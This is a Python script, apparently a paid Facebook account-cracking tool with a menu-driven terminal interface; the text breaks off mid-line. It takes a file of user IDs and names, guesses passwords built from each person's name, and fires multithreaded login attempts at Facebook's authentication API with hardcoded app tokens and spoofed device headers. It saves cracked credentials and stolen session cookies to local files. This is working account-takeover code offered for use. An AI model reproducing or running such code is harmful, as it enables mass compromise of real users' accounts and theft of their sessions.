"""OPEN BY ALTALIMUL ISLAM """
#_____________________[ADMIN BOX]____________________________#
""" AUTHOR : ALTALIMUL ISLAM MITUL """
""" OWNER : ARAFAT AHAMMAD """
#_____________________[IMPORT BOX]____________________________#
import os,sys,random,string,json,uuid,base64,requests,httpx,time,datetime,platform, subprocess, re, shutil
from time import localtime as lt
from time import sleep
from string import *
from rich.panel import Panel
from rich.console import Console
console = Console()
try:import git 
except ModuleNotFoundError:os.system('pip install -q gitpython');import git
from concurrent.futures import ThreadPoolExecutor as Tred
import hashlib,subprocess
#▬▭▬▭▬▭▬▭[ INSTALL ]▬▭▬▭▬▭▬▭#
try:import requests
except ModuleNotFoundError:
    os.system("clear");os.system("pip install requests")
    try:import requests
    except Exception as e:print(e);exit()
#_____________________[ETC]____________________________#
cpx,cokix,twx=[],[],[]
ok,cp,twf,okx=[],[],[],0
loop = 0
#_____________________[COLOUR BOX]____________________________#
W = "\033[1;37m";G = "\033[38;5;46m";G1 = "\033[38;5;47m";G2 = "\033[38;5;48m";G3 = "\033[38;5;49m";G4 = "\033[38;5;50m";R = "\033[38;5;196m";R3 = "\033[38;5;1m";R1 = "\033[38;5;202m";R2 = "\033[38;5;203m";C = "\033[38;5;4m";K="\033[38;5;15m";A="\033[38;5;248m";LG="\033[38;5;195m";A1="\033[38;5;250m";A2="\033[38;5;251m";A3="\033[38;5;252m";A4="\033[38;5;253m";A5="\033[38;5;254m";B="\033[38;5;153m";rad="\033[1;31m"
logo = '\x1b[38;5;154m';logo1 = '\x1b[38;5;155m';logo2 = '\x1b[38;5;156m';logo3 = '\x1b[38;5;157m';logo4 = '\x1b[38;5;158m'
#_____________________[SIM NAME CODE]____________________________#
try:
    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
    ahydra = output.replace(',', '|').replace('\n', '')
except Exception as e:
    pass
    ahydra = None
#_____________________[BIT & DATE BOX]____________________________#
bit = platform.architecture()[0]
z = f'{W}[{G}✗{W}] '
age = f'{W}[{G}';pore = f'{W}] '
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+f'{W}-{G}'+str(bln)+f'{W}-{G}'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#---------------------------------------------[UPDATE SERVER]---------------------------------------------#
axm1 = requests.get("Add your server url").text.strip()
axm2 = requests.get("Add your server url").text.split('\n')[0]
axm3 = requests.get("Add your server url").text.strip()
axm4 = requests.get("Add your server url").text.strip()
#---------------------------------------------[FILE UPDATE]---------------------------------------------#
arafat1 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{axm1}'
arafat2 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{axm2}'
arafat3 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{axm3}'
arafat4 = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{axm4}'
#_____________________[ANIMATION BOX]____________________________#
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.1)
#__________________[ TOOL VERSION ]__________________#
try:
    version = requests.get("htt"+"ps://r"+"aw.git"+"hubus"+"erc"+"onten"+"t.com/AR"+"AFAT-"+"X-MI"+"TUL/AC"+"CE"+"SS/ma"+"in/vers"+"ion.txt").text
except:
    print('No Internet Connection');exit()
version = version.strip()
session = requests.Session()
#_____________________[MAIN CLASS BOX]____________________________#
class __Main_all_sys___for__run__:
    def __init__(self):
        self.line = f'{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
        self.logo = (f"""\n {logo} █████  ██   ██ ███    ███  {W}┃ \n {logo}██   ██  ██ ██  ████  ████  {W}┃     \n {logo}███████   ███   ██ ████ ██  {W}┃ SIM {R}× {G}{ahydra}\n {logo}██   ██  ██ ██  ██  ██  ██  {W}┃ DEVICE {R}× {G}{bit}\n {logo}██   ██ ██   ██ ██      ██  {W}┃ VERSION {R}× {G}PAID {R}× {G}{version}\n{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━\n          {R}× {G}AXM AGAIN BACK WITH NEW LOOK {R}×\n{self.line}\n{z}{W}AUTHOR  : {G}ALTALIMUL ISLAM {W}({G4}MITUL{W})\n{z}{W}OWNER   : {G}ARAFAT AHAMMED\n{z}{W}GITHUB  : {G}ARAFAT-X-MITUL \n{z}{W}TOOL    : {G}FILE {R}× {G}RANDOM\n{self.line}""")
#_____________________[END BOX]____________________________#
    def __end__(self,ok,cp,twf):
        print(self.line)
        print(f'{z}{G}THE PROCESS HAS BEEN COMPLETED....!\n{z}TOTAL OK IDS : {G}{len(ok)}\n{z}TOTAL CP IDS : {R}{len(cp)}\n{z}TOTAL 2F IDS : {B}{len(twf)}\n{self.line}')
        ax = input(f'{z}DO YOU WANT TO CRACK AGAIN ({G}y{W}/{R}n{W}) : {G}')
        if ax in ['1','y','Y','yes','Yes','YES']:__Main_all_sys___for__run__().___file__RanD_All__()
        else:exit(f'{self.line}\n{z}{G}THANKS FOR USING OUR TOOL.....!')
#_____________________[LOGO BOX]____________________________#
    def __logo__(self):
        os.system('clear')
        print(self.logo)
#_____________________[MENU BOX]____________________________#
    def ___file__RanD_All__(self):
        __Main_all_sys___for__run__().__logo__();print(f'{age}1{pore}START RANDOM CLONE\n{age}2{pore}START FILE CLONE\n{age}3{pore}START FILE MAKE\n{age}4{pore}REPORT BUG \n{age}5{pore}EXIT TERMINAL\n{self.line}')
        ch = input(f'{z}CHOOSE : {G}')
        if ch in ['1','a','A']:os.system("./RANDOM")
        elif ch in ['2','b','B']:__Main_all_sys___for__run__().__fILe_MenU__()
        elif ch in ['3','c','C']:__Main_all_sys___for__run__().__logo__();animation(f'{z}{G}COMING SOON.....!');time.sleep(3);__Main_all_sys___for__run__().___file__RanD_All__()
        elif ch in ['4','d','D']:os.system('xdg-open https://www.facebook.com/ARAFAT19847000');sleep(4);__Main_all_sys___for__run__().__logo__();animation(f'{z}{G}THANKS FOR YOUR FEEDBACK....!');sleep(2);__Main_all_sys___for__run__().__logo__();animation(f'{z}{G}RESTARTING THE TOOL.......!');sleep(0.5);__Main_all_sys___for__run__().___file__RanD_All__()
        elif ch in ['5','e','E']:exit(f'{self.line}\n{z}{G}THANKS FOR USING OUR TOOL.....!')
        else:print(f'{z}{R}SORRY WRONG INPUT....!');sleep(3);__Main_all_sys___for__run__().__logo__();animation(f'{z}{G}RESTARTING THE TOOL.....!');sleep(2);__Main_all_sys___for__run__().___file__RanD_All__()
#_____________________[FILE MENU BOX]____________________________#
    def __fILe_MenU__(self):
        __Main_all_sys___for__run__().__logo__()
        file = input(f'{z}INPUT FILE PATH : {G}')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print(f'{z}{R}SORRY FILE NOT FOUND.....!');sleep(3);__Main_all_sys___for__run__().__logo__();animation(f'{z}{G}TRYING AGAIN.......!');sleep(1);__Main_all_sys___for__run__().__fILe_MenU__()
        __Main_all_sys___for__run__().__logo__()
        print(f'{age}1{pore}METHOD A {W}[{G}S1{W}]\n{age}2{pore}METHOD B {W}[{G}S2{W}]\n{age}3{pore}METHOD C {W}[{G}S3{W}]\n{age}4{pore}METHOD D {W}[{G}S4{W}]\n{self.line}')
        meth = input(f'{z}CHOOSE : {G}')
        __Main_all_sys___for__run__().__logo__()
        plist=[]
        print(f'{age}1{pore}CRACK WITH AUTO PASS\n{age}2{pore}CRACK WITH MANUAL PASS\n{self.line}')
        xdx = input(f'{z}CHOOSE : {G}')
        if xdx in ['1','a','A']:
            __Main_all_sys___for__run__().__logo__()
            ps_limit = 'AUTO PASS'
            print(f'{age}1{pore}CRACK WITH BD PASSLIST    {G}[{W} 32 PASS {G}]\n{age}2{pore}CRACK WITH INDIA PASSLIST\n{age}3{pore}CRACK WITH NEPAL PASSLIST\n{age}4{pore}CRACK WITH BD PASSLIST    {G}[{W} 19 PASSWORD {G}]\n{self.line}')
            coun = input(f'{z}CHOOSE : {G}')
            if coun in ['1','a','A']:plist.append('first last');plist.append('firstlast');plist.append('First Last');plist.append('first12345');plist.append('first1234');plist.append('first123');plist.append('first12');plist.append('first1');plist.append('first11');plist.append('first111');plist.append('first1212');plist.append('first1122');plist.append('first22');plist.append('first@');plist.append('@first@');plist.append('first@@');plist.append('last12345');plist.append('last1234');plist.append('last123');plist.append('last12');plist.append('last1');plist.append('last11');plist.append('last111');plist.append('last1212');plist.append('last1122');plist.append('last@');plist.append('@last@');plist.append('last@@');plist.append('last22');plist.append('firstlast1234');plist.append('firstlast123');plist.append('firstlast12')
            elif coun in ['2','b','B']:plist.append('first last');plist.append('firstlast');plist.append('57273200');plist.append('59039200');plist.append('57575751')
            elif coun in ['3','c','C']:plist.append('first123456');plist.append('first12345');plist.append('first1234');plist.append('first123');plist.append('first12');plist.append('first111');plist.append('first@1');plist.append('first@123');plist.append('firstfirst');plist.append('firstlast');plist.append('firstlast123');plist.append('last123');plist.append('first first');plist.append('first last');plist.append('sangma');plist.append('tamang');plist.append('nepal123')
            elif coun in ['4','d','D']:plist.append('firstlast');plist.append('first last');plist.append('first');plist.append('first@');plist.append('first123');plist.append('first@@@');plist.append('first1234');plist.append('first1122');plist.append('first12345');plist.append('first@@');plist.append('first12');plist.append('first11');plist.append('first1');plist.append('first00');plist.append('@12345@');plist.append('@123456@');plist.append('@1234567@');plist.append('@first@');plist.append('first@#')
            else:plist.append('firstlast');plist.append('first last');plist.append('first@1');plist.append('first123');plist.append('last11')
        elif xdx in ['2','b','B']:
            try:
                __Main_all_sys___for__run__().__logo__()
                ps_limit = int(input(f'{z}HOW MANY PASS DO YOU WANT TO ADD ? : {G}'))
            except:
                ps_limit = 5
            __Main_all_sys___for__run__().__logo__()
            print(f'{z}BD PASSLIST  : {G}first last{W}, {G}first123 etc...\n{z}IND PASSLIST : {G}59039200{W}, {G}57575751{W}, {G}57273200 etc...\n{z}NEP PASSLIST : {G}first last{W}, {G}sangma{W}, {G}tamang etc...\n{self.line}')
            for i in range(ps_limit):
                plist.append(input(f'{z}ENTER PASSWORD [{G}{i+1}{W}] : {G}'))
                print(self.line)
        __Main_all_sys___for__run__().__logo__()
        cpi = input(f'{z}DO YOU WANT TO SHOW CP ID ({G}y{W}/{R}n{W}) : {G}')
        if cpi in ['1','y','Y','yes','Yes','YES']:cpx.append('y')
        else:cpx.append('n')
        __Main_all_sys___for__run__().__logo__()
        twi = input(f'{z}DO YOU WANT TO SHOW 2F ID ({G}y{W}/{R}n{W}) : {G}')
        if twi in ['1','y','Y','yes','Yes','YES']:twx.append('y')
        else:cpx.append('n')
        __Main_all_sys___for__run__().__logo__()
        coi = input(f'{z}DO YOU WANT TO SHOW COOKIE ({G}y{W}/{R}n{W}) : {G}')
        if coi in ['1','y','Y','yes','Yes','YES']:cokix.append('y')
        else:cokix.append('n')
        with Tred(max_workers=45) as XDX:
            __Main_all_sys___for__run__().__logo__()
            print(f'{z}TOTAL UID  : {G}{len(fo)}\n{z}PASS LIMIT : {G}{ps_limit}\n{z}TODAY DATE : {G}{date}\n{z}USE AIRPLANE MODE {G}ON{W}/{R}OFF {W}FOR MORE OK IDS \n{self.line}')
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                limit = str(len(fo))
                if meth in ['1','a','A']:XDX.submit(self.__file__s1__,ids,names,limit,passlist)
                elif meth in ['2','b','B']:XDX.submit(self.__file__s2__,ids,names,limit,passlist)
                elif meth in ['3','c','C']:XDX.submit(self.__file__s3__,ids,names,limit,passlist)
                elif meth in ['4','d','D']:XDX.submit(self.__file__s4__,ids,names,limit,passlist)
        __Main_all_sys___for__run__().__end__(ok,cp,twf)
#_____________________[FILE METHOD S1]____________________________#
    def __file__s1__(self,ids,names,limit,passlist):
        try:
            global ok,cp,twf,loop,okx
            sys.stdout.write(f"\r\r{W}[{G}CRACKING{W}|{G}S1{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fs = names.split(' ')[0]
            try:
                ls = names.split(' ')[1]
            except:
                ls = fs
            for pw in passlist:
                pas = pw.replace('first',fs.lower()).replace('First',fs.capitalize()).replace('last',ls.lower()).replace('Last',ls.capitalize()).replace('Name',names)
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()), "format": "json", "device_id": str(uuid.uuid4()), "cpl": "true", "family_device_id": str(uuid.uuid4()), "credentials_type": "device_based_login_password", "error_detail_type": "button_with_disabled", "source": "device_based_login", "email": ids, "password": pas, "access_token": "256002"+"347743"+"983|374e"+"60f8b9bb6b"+"8cbb30f7803"+"0438895", "generate_session_cookies": "1", "meta_inf_fbmeta": "", "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0", "locale": "en_GB", "client_country_code": "GB","method": "auth.login", "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "api_key": "882a8490361da98702bf97a021ddc14d"}
                    headers = {'User-Agent': arafat1, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'Authorization':'OAuth 3506'+'85531'+'728%257C6'+'2f8ce9f74b'+'12f84c123c'+'c23437'+'a4a32', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                    q = session.post("https://a"+"pi.face"+"book.com/au"+"th/lo"+"gin",data=data, headers=headers, allow_redirects=False).json()
                    twwf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        print(f'\r\r{W}[{G}::{W}] {W}[{G}AXM-OK{W}] {G}{ids} {R}× {G}{pas}')
                        ok.append(ids)
                        open('/sdcard/AXM-FILE-M1-OK.txt', 'a').write(ids+'|'+pas+"\n")
                        open('/sdcard/AXM-FILE-M1-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                        if 'y' in cokix:
                            print(f'\r\r{W}[{G}::{W}] {W}[{G}COOKIE{W}] {R}× {G}{coki}');print(self.line)
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        cp.append(ids)
                        open('/sdcard/AXM-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                        if 'y' in cpx:
                            print(f'\r\r{W}[{R}::{W}] {W}[{R}AXM-CP{W}] {R}{ids} {R}× {R}{pas}')
                            break
                    elif twwf in str(q):
                        twf.append(ids)
                        open('/sdcard/AXM-FILE-M1-2F.txt','a').write(ids+'|'+pas+'\n')
                        if 'y' in twx:
                            print(f'\r\r{W}[{B}::{W}] {W}[{B}AXM-2F{W}] {B}{ids} {R}× {B}{pas}')
                            break
                    else:continue
            loop+=1
        except Exception as e:time.sleep(30)
#_____________________[FILE METHOD S2]____________________________#
    okx=0
    def __file__s2__(self,ids,names,limit,passlist):
        try:
            global ok,cp,twf,loop,okx
            sys.stdout.write(f"\r\r{W}[{G}CRACKING{W}|{G}S2{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fs = names.split(' ')[0]
            try:
                ls = names.split(' ')[1]
            except:
                ls = fs
            for pw in passlist:
                pas = pw.replace('first',fs.lower()).replace('First',fs.capitalize()).replace('last',ls.lower()).replace('Last',ls.capitalize()).replace('Name',names)
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()), "format": "json", "device_id": str(uuid.uuid4()), "cpl": "true", "family_device_id": str(uuid.uuid4()), "credentials_type": "device_based_login_password", "error_detail_type": "button_with_disabled", "source": "device_based_login", "email": ids, "password": pas, "access_token": "256002"+"347743"+"983|374e"+"60f8b9bb6b"+"8cbb30f7803"+"0438895", "generate_session_cookies": "1", "meta_inf_fbmeta": "", "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0", "locale": "en_GB", "client_country_code": "GB","method": "auth.login", "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "api_key": "882a8490361da98702bf97a021ddc14d"}
                    headers = {'User-Agent': arafat2, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'Authorization':'OAuth 3506'+'85531'+'728%257C6'+'2f8ce9f74b'+'12f84c123c'+'c23437'+'a4a32', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                    q = session.post("https://a"+"pi.face"+"book.com/au"+"th/lo"+"gin",data=data, headers=headers, allow_redirects=False).json()
                    twwf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        print(f'\r\r{W}[{G}::{W}] {W}[{G}AXM-OK{W}] {G}{ids} {R}× {G}{pas}')
                        ok.append(ids)
                        open('/sdcard/AXM-FILE-M2-OK.txt', 'a').write(ids+'|'+pas+"\n")
                        open('/sdcard/AXM-FILE-M2-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                        if 'y' in cokix:
                            print(f'\r\r{W}[{G}::{W}] {W}[{G}COOKIE{W}] {R}× {G}{coki}');print(self.line)
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        cp.append(ids)
                        open('/sdcard/AXM-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                        if 'y' in cpx:
                            print(f'\r\r{W}[{R}::{W}] {W}[{R}AXM-CP{W}] {R}{ids} {R}× {R}{pas}')
                            break
                    elif twwf in str(q):
                        twf.append(ids)
                        open('/sdcard/AXM-FILE-M2-2F.txt','a').write(ids+'|'+pas+'\n')
                        if 'y' in twx:
                            print(f'\r\r{W}[{B}::{W}] {W}[{B}AXM-2F{W}] {B}{ids} {R}× {B}{pas}')
                            break
                    else:continue
            loop+=1
        except Exception as e:time.sleep(30)
#_____________________[FILE METHOD S3]____________________________#
    okx=0
    def __file__s3__(self,ids,names,limit,passlist):
        try:
            global ok,cp,loop,okx
            sys.stdout.write(f"\r\r{W}[{G}CRACKING{W}|{G}S3{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                access_token = f'2560'+'02347743'+'983|374e'+'60f8b9bb'+'6b8cbb30f7'+'8030438895'
                fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,70))+'.'+str(random.randint(111,555))
                fbbv = str(random.randint(00000000,99999999))
                fbrv = str(random.randint(00000000,99999999))
                fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
                fbsv_ = fbsv.replace("_",".")
                model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
                abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
                build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
                ua = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') [FBAN/FBIOS;FBAV/'+fbav+';FBBV/'+fbbv+';[FBAN/FBIOS;FBAV/411.0.0.33.109;FBBV/466623474;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBID/phone;FBLC/ar_IL;FBOP/5;FBRV/469986951] [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;] [FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;] [FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Amazon.com;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;] Dalvik/2.1.0 (Linux; U; Android 12; vivo 1920 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/Wifi service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;] [FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681925;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/213310081;FBCR/alfa;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8142;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;] [FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=2.625,width=2434,height=1096};FBLC/zh_HK;FBRV/334731776;FBCR/my best phone;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-AT52;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]'
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'api_key':'c1e620fa708a1d5696fb991c1bde5662',
                'community_id':'',
                'device_id':str(uuid.uuid4()),
                'family_device_id':str(uuid.uuid4()),
                'currently_logged_in_userid':'0',
                'try_num':'1',
                'email':ids,
                'password':pas,
                'generate_analytics_claim':'1',
                'cpl':'true',
                'generate_session_cookies':'1',
                'credentials_type':'password',
                'error_detail_type':'button_with_disabled',
                'source':'auth.login',
                'locale':'fr_FR',
                'client_country_code':'FR',
                'advertising_id':str(uuid.uuid4()),
                'meta_inf_fbmeta':'NO_FILE',
                'access_token':access_token}
                head = {
                'Authorization':'OAuth '+access_token,
                'Host': 'b-graph.facebook.com',
                'X-FB-Connection-Quality':'EXCELLENT',
                'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                'x-fb-net-hni':str(random.randint(2e4,4e4)),
                'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
                'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                'x-fb-friendly_name':'authenticate',
                'content-encoding':'application/x-www-form-urlencoded',
                'x-tigon-is_retry':'true',
                'x-fb-http-engine':'Liger',
                'x-requested-with':'FBIOS',
                'connection':'keep-alive',
                'user-agent':ua}
                po = session.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"
                    print(f'\r\r{W}[{G}::{W}] {W}[{G}AXM-OK{W}] {G}{ids} {R}× {G}{pas}')
                    open('/sdcard/AXM-FILE-M3-OK.txt', 'a').write(ids+'|'+pas+"\n")
                    open('/sdcard/AXM-FILE-M3-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                    ok.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\033[1;33m [AXM-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/AXM-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                    cp.append(ids)
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:pass
#_____________________[FILE METHOD S4]____________________________#
    okx=0
    def __file__s4__(self,ids,names,limit,passlist):
        try:
            global ok,cp,loop,okx
            sys.stdout.write(f"\r\r{W}[{G}CRACKING{W}|{G}S4{W}] [{G3}{loop}{W}/{G4}{limit}{W}] [{G}{len(ok)}{W}/{R}{len(cp)}{W}/{B}{len(twf)}{W}]");sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                access_token = f'66'+'28'+'56837'+'9|c1e62'+'0fa708'+'a1d5'+'696fb99'+'1c1bde'+'5662'
                fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,70))+'.'+str(random.randint(111,555))
                fbbv = str(random.randint(00000000,99999999))
                fbrv = str(random.randint(00000000,99999999))
                fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
                fbsv_ = fbsv.replace("_",".")
                model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
                abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
                build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
                ua = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') [FBAN/FBIOS;FBAV/'+fbav+';FBBV/'+fbbv+';[FBAN/FBIOS;FBAV/411.0.0.33.109;FBBV/466623474;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBID/phone;FBLC/ar_IL;FBOP/5;FBRV/469986951] [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;] [FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;] [FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Amazon.com;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;] Dalvik/2.1.0 (Linux; U; Android 12; vivo 1920 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/Wifi service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;] 